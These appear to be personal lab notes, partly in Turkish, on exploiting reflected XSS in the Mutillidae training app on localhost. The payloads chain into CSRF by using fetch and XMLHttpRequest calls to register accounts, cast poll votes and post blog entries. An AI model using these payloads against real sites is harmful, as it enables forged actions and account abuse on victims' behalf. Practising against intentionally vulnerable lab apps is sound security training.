EXPERIMENT2


https://localhost/mutillidae/index.php?said=%3Ch1%3ESaid%3C/h1%3E

-------------------------------------------
https://localhost/mutillidae/index.php?said=%3Cscript%3Ewindow.alert(%22hi%22)%3C/script%3E


CSRF TOKEN E GEREK YOK
REGISTER
-------------------------------------------
https://localhost/mutillidae/index.php?said=

<script>
        var formData =
            "username=username%26password=password%26confirm_password=password%26my_signature=signature%26register-php-submit-button=Create+Account";
        const requestOptions = {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: formData,
        };
        fetch("https://localhost/mutillidae/index.php?page=register.php", requestOptions);
</script>



ONCEDEN CSRF TOKEN I ELDE ETMEN LAZIM EĞER Kİ SECURITY LEVEL I 1 E ÇEKERSEN...
VOTE POLL
-------------------------------------------
https://localhost/mutillidae/index.php?said=

<script>
	const requestOptions = {
	    method: "GET",
	};
	fetch("https://localhost/mutillidae/index.php?page=user-poll.php%26choice=netcat%26initials=said%26csrf-token=93324%26user-poll-php-submit-button=Submit+Vote", requestOptions);
</script>


ADD BLOG
-------------------------------------------
http://localhost/mutillidae/?said=<script>%20let%20xhr%20=%20new%20XMLHttpRequest();var%20json%20=%20%22csrf-token=62216%26blog_entry=SaidVirus%26add-to-your-blog-php-submit-button=Save+Blog+Entry%22;xhr.open(%22POST%22,%20%22index.php?page=add-to-your-blog.php%22);xhr.setRequestHeader(%22Content-type%22,%20%22application/x-www-form-urlencoded%22);xhr.send(json);</script>



